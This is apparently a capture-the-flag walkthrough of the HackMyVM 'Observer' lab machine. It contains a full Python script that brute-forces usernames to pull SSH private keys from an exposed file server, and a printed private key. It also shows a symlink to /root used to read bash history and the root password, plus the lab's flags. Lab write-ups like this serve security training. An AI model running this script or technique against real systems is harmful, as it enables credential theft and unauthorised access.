---
icon: linux
---

**Platform:** HackMyVM\
**Operating System:** Linux

> **Tags:** `Linux` `Python` `Fuzzing` `Sudoers` `Systemctl` `Symlink Exploitation` `Bash History`

## INSTALLATION

We download the `zip` containing the `.ova` of the Observer machine, extract it, and import it into VirtualBox.

We configure the network interface of the Observer machine and run it alongside the attacker machine.

## HOST DISCOVERY

At this point, we still don’t know which `IP` address is assigned to Observer, so we discover it as follows:

```bash
netdiscover -i eth1 -r 10.0.0.0/24
```

Info:

```
Currently scanning: Finished!   |   Screen View: Unique Hosts                 
                                                                               
 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240               
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 10.0.4.1        52:54:00:12:35:00      1      60  Unknown vendor              
 10.0.4.2        52:54:00:12:35:00      1      60  Unknown vendor              
 10.0.4.3        08:00:27:33:41:f8      1      60  PCS Systemtechnik GmbH      
 10.0.4.28       08:00:27:f6:7e:54      1      60  PCS Systemtechnik GmbH
```

We identify with high confidence that the victim’s IP is `10.0.4.28`.

## PORT SCANNING

Next, we perform a general scan to check which ports are open, followed by a more exhaustive scan to gather relevant service information.

```bash
nmap -n -Pn -sS -sV -p- --open --min-rate 5000 10.0.4.28
```

```bash
nmap -n -Pn -sCV -p22,3333 --min-rate 5000 10.0.4.28
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-19 17:31 CEST
Nmap scan report for 10.0.4.28
Host is up (0.00018s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2 (protocol 2.0)
| ssh-hostkey: 
|   256 06:c9:a8:8a:1c:fd:9b:10:8f:cf:0b:1f:04:46:aa:07 (ECDSA)
|_  256 34:85:c5:fd:7b:26:c3:8b:68:a2:9f:4c:5c:66:5e:18 (ED25519)
3333/tcp open  http    Golang net/http server
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 200 OK
|     Date: Sun, 19 Oct 2025 15:31:57 GMT
|     Content-Length: 105
|     Content-Type: text/plain; charset=utf-8
|     OBSERVING FILE: /home/nice ports,/Trinity.txt.bak NOT EXIST 
|     <!-- AcmaAvASRDtXBDGnMCDMOfzVWicMsnHMV -->
|   GenericLines, Help, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, Socks5: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Date: Sun, 19 Oct 2025 15:31:42 GMT
|     Content-Length: 78
|     Content-Type: text/plain; charset=utf-8
|     OBSERVING FILE: /home/ NOT EXIST 
|     <!-- ryhmSlaOSSUVsZsmHKaNgeqzCZeWGRHMV -->
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Date: Sun, 19 Oct 2025 15:31:42 GMT
|     Content-Length: 78
|     Content-Type: text/plain; charset=utf-8
|     OBSERVING FILE: /home/ NOT EXIST 
|     <!-- rDuCuWPtQAqMTyVfpvpkHdgWhxbhMSHMV -->
|   OfficeScan: 
|     HTTP/1.1 400 Bad Request: missing required Host header
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|_    Request: missing required Host header
|_http-trane-info: Problem with XML parsing of /evox/about
MAC Address: 08:00:27:F6:7E:54 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.61 seconds
```

Ports `22` and `3333` are open.

Port `3333` accepts `HTTP` requests and lists files under the `/home/` path. After manually probing a few paths, I believe the best approach is to try to retrieve a user’s `id_rsa` `private key` via port `3333`.

However, we do not know any `usernames`, so we are going to write a Python script to `brute force` the `{user}/.ssh/id_rsa` path.

## BRUTE FORCE

```bash
nano brute_rsa.py
```

Info:

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests
import re
import sys
from time import sleep


TARGET = "http://10.0.4.28:3333"  
WORDLIST = "/usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt"
TIMEOUT = 5

KEY_RE = re.compile(r"-----BEGIN (RSA|OPENSSH|DSA|EC) PRIVATE KEY-----", re.IGNORECASE)
SPACES = " " * 60

try:
    with open(WORDLIST, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            user = line.strip()
            if not user:
                continue

            url = f"{TARGET.rstrip('/')}/{user}/.ssh/id_rsa"
            try:
                r = requests.get(url, timeout=TIMEOUT)
            except requests.RequestException as e:
                print(f"[x] error for {user}: {e}{SPACES}", end="\r")
                sleep(0.1)
                continue

            body = r.text or ""
            if "NOT EXIST" in body or "not exist" in body.lower() or r.status_code == 404:
                print(f"[-] {user}{SPACES}", end="\r")
                continue

            if KEY_RE.search(body):
                print(f"\n[!!!] PRIVATE KEY FOUND for user: {user}")
                print(f"URL: {url}\n")
                print(body)
                with open("found_key.txt", "w", encoding="utf-8") as out:
                    out.write(f"=== USER: {user} | URL: {url} ===\n\n")
                    out.write(body)
                break

except KeyboardInterrupt:
    print("\n[!]Interrupted by user.")
    sys.exit(0)
except FileNotFoundError:
    print(f"[x] Couldn't find specified wordlist: {WORDLIST}")
    sys.exit(1)
```

We give the `script` execute permissions and run it.

```bash
chmod +x brute_rsa.py
./brute_rsa.py
```

Info:

```
[!!!] PRIVATE KEY FOUND for user: jan
URL: http://10.0.4.28:3333/jan/.ssh/id_rsa

-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

We obtain the `private key` for user `jan`.

We save this key to a file and set the appropriate permissions so it can be used for user authentication.

```bash
nano jan_id_rsa
chmod 600 jan _id_rsa
```

Now we can `SSH` in as `jan`:

```bash
ssh -i jan_id_rsa jan@10.0.4.28
```

Inside `/home/jan/` we find the `user flag`.

```
HMVdDepYxsi8VSucdruB3P7
```

## PRIVILEGE ESCALATION

To escalate privileges, we first check `sudo` and `SUID` permissions.

```bash
sudo -l
```

Info:

```
Matching Defaults entries for jan on observer:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User jan may run the following commands on observer:
    (ALL) NOPASSWD: /usr/bin/systemctl -l status
```

We run `/usr/bin/systemctl -l status` and find the following output:

Info:

```
● observer
    State: running
    Units: 235 loaded (incl. loaded aliases)
     Jobs: 0 queued
   Failed: 0 units
    Since: Sun 2025-10-19 17:10:39 CEST; 1h 31min ago
  systemd: 252.12-1~deb12u1
   CGroup: /
           ├─init.scope
           │ └─1 /sbin/init
           ├─system.slice
           │ ├─cron.service
           │ │ ├─435 /usr/sbin/cron -f
           │ │ ├─440 /usr/sbin/CRON -f
           │ │ ├─444 /bin/sh -c /opt/observer
           │ │ └─445 /opt/observer
......................<REST_OF_OUTPUT>.........................................
```

We find a binary called observer running in `/opt/`, which is likely the same service running on port `3333`.

```bash
ls -la /opt/observer
```

Info:

```
-rwxr-xr-x 1 root root 7376728 ago 21  2023 /opt/observer
```

We confirm it is running with `root` privileges.

We create a `symbolic link` to the `/root/` directory inside `/home/jan/` so we can access it via the web server.

```bash
ln -s /root .
```

The symlink is created. We browse the `root` directory and view the `.bash_history`.

![](../../images/bash_h.png)

We find a `password` and use it to authenticate as `root : fuck1ng0bs3rv3rs`.

```bash
su root
```

Info:

```
root@observer:/home/jan# whoami
root
root@observer:/home/jan#
```

We are now `root`!

Inside the `/root/` directory we find the `root flag`:

```
HMVb6MPDxdYLLC3sxNLIOH1
```
